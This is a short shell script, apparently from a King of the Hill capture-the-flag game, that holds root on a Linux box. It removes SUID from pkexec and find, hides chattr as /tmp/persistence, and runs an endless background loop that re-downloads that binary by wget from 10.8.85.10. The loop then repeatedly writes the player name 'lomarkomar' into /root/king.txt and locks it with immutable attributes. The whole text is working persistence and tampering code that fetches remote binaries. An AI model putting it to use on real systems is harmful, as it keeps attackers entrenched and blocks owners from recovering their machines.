chmod -s /usr/bin/pkexec
chmod -s $(which find)
mv $(which chattr) /tmp/persistence
while true; do
     if ls -l /tmp/persistence
          then
               echo OK
          else
          	wget 10.8.85.10/chattr
          	mv chattr /tmp/persistence
          	chmod +x /tmp/persistence
          	echo DONE
     fi
     /tmp/persistence -ia /root
     /tmp/persistence -ia /root/king.txt 2>/dev/null
     echo -n "lomarkomar" >| /root/king.txt 2>/dev/null
     /tmp/persistence +ia /root/king.txt 2>/dev/null
     /tmp/persistence +ia /root
done &
